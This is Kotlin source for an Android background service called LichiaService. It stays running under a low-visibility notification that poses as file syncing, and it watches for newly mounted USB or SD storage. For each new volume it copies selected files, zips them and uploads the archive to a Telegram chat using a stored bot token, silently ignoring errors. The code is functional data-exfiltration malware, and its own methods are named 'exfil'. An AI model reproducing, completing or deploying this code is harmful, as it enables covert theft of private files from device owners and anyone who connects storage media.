package br.com.lichia.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import java.io.File
import java.io.FileOutputStream
import java.util.Collections
import java.util.concurrent.Executors
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class LichiaService : Service() {

    companion object {
        @Volatile var isActive: Boolean = false
    }

    private val watchPool = Executors.newSingleThreadExecutor()
    private val exfilPool = Executors.newFixedThreadPool(3)
    @Volatile private var running = false
    private val inFlight = Collections.synchronizedSet(HashSet<String>())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForegroundNow()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            isActive = true
            watchPool.execute { watchLoop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        isActive = false
        super.onDestroy()
    }


    private fun startForegroundNow() {
        val ch = NotificationChannel(
            "lichia", "lichia", NotificationManager.IMPORTANCE_MIN)
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        val n = Notification.Builder(this, "lichia")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentTitle("Lichia")
            .setContentText("sincronização ativa")
            .setOngoing(true)
            .build()
        startForeground(1, n)
    }


    private fun mountedRoots(): List<File> {
        val st = File("/storage")
        return st.listFiles()?.filter {
            it.isDirectory && it.name != "emulated" && it.name != "self" &&
                it.list() != null
        } ?: emptyList()
    }


    private fun watchLoop() {
        val known = mountedRoots().map { it.absolutePath }.toHashSet()
        while (running) {
            val now = mountedRoots().map { it.absolutePath }
            for (p in now) {
                if (p !in known && p !in inFlight) {
                    inFlight.add(p)
                    exfilPool.execute { exfil(p) }
                }
            }
            known.clear()
            known.addAll(now)
            try { Thread.sleep(3000) } catch (e: InterruptedException) { return }
        }
    }


    private fun exfil(rootPath: String) {
        val cache = File(cacheDir, "lichia_cache")
        val zip = File(cacheDir, "lichen.zip")
        try {
            val c = Prefs.read(this)
            if (c.token.isEmpty() || c.chatId.isEmpty()) return
            val root = File(rootPath)
            if (File(root, Prefs.MARKER).exists()) return
            val files = Collect.files(root, c)
            if (files.isEmpty()) return

            cache.deleteRecursively()
            cache.mkdirs()

            var copied = 0
            for ((rel, f) in files) {
                val dst = File(cache, rel)
                dst.parentFile?.mkdirs()
                try { f.copyTo(dst, true); copied++ } catch (e: Exception) { }
            }
            if (copied == 0) return

            zip.delete()
            ZipOutputStream(FileOutputStream(zip)).use { zos ->
                cache.walkTopDown().filter { it.isFile }.forEach { f ->
                    val rel = f.relativeTo(cache).path
                    zos.putNextEntry(ZipEntry(rel))
                    f.inputStream().use { it.copyTo(zos, 64 * 1024) }
                    zos.closeEntry()
                }
            }


            val totalMb = files.sumOf { it.second.length() } / (1024.0 * 1024.0)
            TgClient.sendText(c.token, c.chatId,
                "lichia: $copied arquivos de $rootPath — " +
                    String.format("%.1f", totalMb) + " MB")

            if (zip.length() <= TgClient.TG_LIMIT) {
                TgClient.sendDocument(c.token, c.chatId, zip, "")
            } else {
                TgClient.sendChunked(c.token, c.chatId, zip, cacheDir)
            }
        } catch (e: Exception) {
        } finally {
            cache.deleteRecursively()
            zip.delete()
            inFlight.remove(rootPath)
        }
    }
}
